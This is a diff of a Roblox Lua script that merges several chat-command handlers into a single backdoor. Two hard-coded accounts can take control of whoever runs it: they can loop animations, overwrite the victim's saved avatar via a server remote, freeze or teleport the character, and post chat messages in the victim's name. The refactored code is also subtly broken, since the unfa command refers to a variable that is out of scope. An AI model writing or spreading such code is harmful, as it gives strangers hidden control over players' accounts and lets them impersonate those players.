@@ -10,53 +10,47 @@ game.StarterGui:SetCore("SendNotification", {
 })
 
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
 
-local targetUsername = "sci_mythical77"
-local myPlayer = Players.LocalPlayer
-local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
-local humanoid = character:FindFirstChildOfClass("Humanoid")
+-- List of target users who can execute commands
+local targetUsernames = {
+    ["sci_mythical77"] = true,
+    ["Rylix56"] = true
+}
 
-if not humanoid then return end
-
-local animation = Instance.new("Animation")
-animation.AnimationId = "rbxassetid://754656200"
-
-local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
-local animationTrack = animator:LoadAnimation(animation)
-
-local function onChat(player, message)
-    if player.Name == targetUsername then
-        local command = message:lower()
-
-        if command == "/e fa" then
-            if animationTrack then
-                animationTrack.Looped = true
-                animationTrack:Play()
-                animationTrack:AdjustSpeed(50)
-            end
-        elseif command == "/e unfa" then
-            if animationTrack then
-                animationTrack:Stop()
-            end
-        end
-    end
+local function isTargetPlayer(playerName)
+    return targetUsernames[playerName] ~= nil
 end
 
-for _, player in ipairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end)
-
-local targetUsername = "sci_mythical77"
-local replicatedStorage = game:GetService("ReplicatedStorage")
-
 local function onChat(player, message)
-    if player.Name == targetUsername and message:lower() == "/e kitten" then
-        local myPlayer = game.Players.LocalPlayer
+    if not isTargetPlayer(player.Name) then return end
+    local command = message:lower()
+
+    if command == "/e fa" then
+        local myPlayer = Players.LocalPlayer
+        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
         
+        if humanoid then
+            local animation = Instance.new("Animation")
+            animation.AnimationId = "rbxassetid://754656200"
+
+            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
+            local animationTrack = animator:LoadAnimation(animation)
+
+            animationTrack.Looped = true
+            animationTrack:Play()
+            animationTrack:AdjustSpeed(50)
+        end
+
+    elseif command == "/e unfa" then
+        if animationTrack then
+            animationTrack:Stop()
+        end
+
+    elseif command == "/e kitten" then
+        local myPlayer = Players.LocalPlayer
         if myPlayer then
             local args = {
                 [1] = {
@@ -66,138 +60,60 @@ local function onChat(player, message)
                     ["ClimbAnimation"] = 2510230574,
                     ["Shirt"] = 11289085978,
                     ["FaceAccessory"] = "13353986061,12580366888,8923599923",
-                    ["RightArmColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["RightArmColor"] = { "248", "248", "248" },
                     ["HairAccessory"] = "13918965164,14314838611",
-                    ["RightArm"] = 0,
-                    ["Head"] = 0,
                     ["FallAnimation"] = 2510233257,
-                    ["TorsoColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["TorsoColor"] = { "248", "248", "248" },
                     ["DepthScale"] = 0.8,
-                    ["RightLeg"] = 0,
                     ["HeightScale"] = 0.9,
                     ["WaistAccessory"] = "14335771887",
-                    ["RightLegColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
-                    ["LeftLegColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
-                    ["WidthScale"] = 0.7,
                     ["BodyTypeScale"] = 0,
                     ["BackAccessory"] = "8651335862",
-                    ["LeftArmColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
                     ["Emotes"] = {
-                        ["1"] = { [1] = 9528286240 },
-                        ["8"] = { [1] = 12874468267 },
-                        ["3"] = { [1] = 7466046574 },
-                        ["2"] = { [1] = 11309263077 },
-                        ["4"] = { [1] = 3576968026 },
-                        ["7"] = { [1] = 13344121112 }
+                        ["1"] = { 9528286240 },
+                        ["8"] = { 12874468267 },
+                        ["3"] = { 7466046574 },
+                        ["2"] = { 11309263077 },
+                        ["4"] = { 3576968026 },
+                        ["7"] = { 13344121112 }
                     },
                     ["Pants"] = 14851012835,
                     ["JumpAnimation"] = 2510236649,
                     ["HatAccessory"] = "12579341301,13142881183,1402432199",
-                    ["LeftArm"] = 0,
-                    ["LeftLeg"] = 0,
-                    ["HeadColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
                     ["WalkAnimation"] = 2510242378,
                     ["IdleAnimation"] = 2510235063,
                     ["RunAnimation"] = 2510238627,
                     ["HeadScale"] = 1,
-                    ["Face"] = 0,
-                    ["AccessoryBlob"] = {
-                        [1] = {
-                            ["Order"] = 1,
-                            ["AssetId"] = 12090385963,
-                            ["AccessoryType"] = "Jacket"
-                        }
-                    },
                     ["GraphicTShirt"] = 10891067215
                 }
             }
-
-            -- Execute the function on your character
-            replicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
+            ReplicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
         end
-    end
-end
 
-for _, player in ipairs(game.Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end
+    elseif command == "/e freeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = true
+        end
 
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end)
+    elseif command == "/e unfreeze" then
+        local myCharacter = Players.LocalPlayer.Character
+        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+            myCharacter.HumanoidRootPart.Anchored = false
+        end
 
-local Players = game:GetService("Players")
-
-local targetUsername = "sci_mythical77"
-
-local function onChat(player, message)
-    if player.Name == targetUsername then
-        if message:lower() == "/e freeze" then
-            
-            local character = game.Players.LocalPlayer.Character
-            if character and character:FindFirstChild("HumanoidRootPart") then
-                character.HumanoidRootPart.Anchored = true
-            end
-        elseif message:lower() == "/e unfreeze" then
-            
-            local character = game.Players.LocalPlayer.Character
-            if character and character:FindFirstChild("HumanoidRootPart") then
-                character.HumanoidRootPart.Anchored = false
+    elseif command:sub(1, 7) == "/e chat" then
+        local chatMessage = message:sub(9)
+        if chatMessage:gsub("%s+", "") ~= "" then
+            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
+            if textChannel then
+                textChannel:SendAsync(chatMessage)
             end
         end
-    end
-end
 
-for _, player in ipairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end)
-
-local TextChatService = game:GetService("TextChatService")
-local Players = game:GetService("Players")
-
-local targetUsername = "sci_mythical77"
-
-local function sendMessage(message)
-    local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
-    if textChannel then
-        textChannel:SendAsync(message)
-    end
-end
-
-local function onChat(player, message)
-    if player.Name == targetUsername then
-        local command = message:lower()
-        if command:sub(1, 7) == "/e chat" then
-            local chatMessage = message:sub(9)
-            if chatMessage:gsub("%s+", "") ~= "" then
-                sendMessage(chatMessage)
-            end
-        end
-    end
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end)
-
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg) onChat(player, msg) end)
-end)
-
-local targetUsername = "sci_mythical77"
-
-local function onChat(player, message)
-    if player.Name == targetUsername and message:lower() == "/e bring" then
+    elseif command == "/e bring" then
         local targetCharacter = player.Character
-        local myPlayer = game.Players.LocalPlayer
+        local myPlayer = Players.LocalPlayer
 
         if myPlayer and targetCharacter then
             local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
@@ -205,7 +121,6 @@ local function onChat(player, message)
 
             if myCharacter and targetHRP then
                 local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
-
                 if myHRP then
                     myHRP.CFrame = targetHRP.CFrame
                 end
@@ -214,11 +129,13 @@ local function onChat(player, message)
     end
 end
 
-for _, player in ipairs(game.Players:GetPlayers()) do
+-- Connect chat event for existing players
+for _, player in ipairs(Players:GetPlayers()) do
     player.Chatted:Connect(function(msg) onChat(player, msg) end)
 end
 
-game.Players.PlayerAdded:Connect(function(player)
+-- Connect chat event for new players joining
+Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(msg) onChat(player, msg) end)
 end)
 
